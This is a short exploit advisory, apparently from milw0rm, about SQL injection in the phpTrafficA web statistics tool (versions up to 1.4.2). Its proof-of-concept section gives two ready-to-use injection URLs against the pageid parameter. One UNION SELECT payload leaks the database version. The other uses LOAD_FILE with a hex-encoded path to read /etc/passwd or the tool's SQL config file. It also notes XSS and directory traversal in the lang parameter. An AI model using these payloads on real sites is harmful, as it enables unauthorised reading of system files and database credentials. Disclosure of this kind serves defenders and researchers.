@@ -1,0 +1,52 @@
+Application: phpTrafficA <= 1.4.2
+Web Site: http://soft.zoneo.net/phpTrafficA/
+Versions: all
+Platform: linux, windows
+Bug: injection sql
+
+
+
+-------------------------------------------------------
+
+1) Introduction
+2) Bug
+3) Proof of concept
+4) Credits
+
+===========
+1) Introduction
+===========
+
+"phpTrafficA is a GPL statistical tool for web traffic analysis, written in php and mySQL.
+It can track access counts to your website, search engines, keywords, and referrers that lead to you,
+operating systems, web browsers, visitor retention, path analysis, and a lot more!"
+
+======
+2) Bug
+======
+
+injection sql
+
+
+
+=====
+3)proof of concept
+=====
+
+
+exemple of exploitation :
+1)http://site.com/index.php?mode=stats&sid=THE_WEB_SITE_SID_HERE&show=page&pageid=-32+union+select+1,@@version/*
+
+2)http://site.com/index.php?mode=stats&sid=THE_WEB_SITE_SID_HERE&show=page&pageid=-32+union+select+1,LOAD_FILE(0x2F6574632F706173737764)/*
+--> load some file as /etc/passwd or /path/www/stats/Php/config_sql.php
+
+?lang= is also vulnerable to xss attacks, and as Hamid Ebadi has mention $lang is also vulnerable to directory transversal
+
+=====
+4)Credits
+=====
+
+laurent gaffie
+contact : laurent.gaffie@gmail.com
+
+# milw0rm.com [2007-06-24]
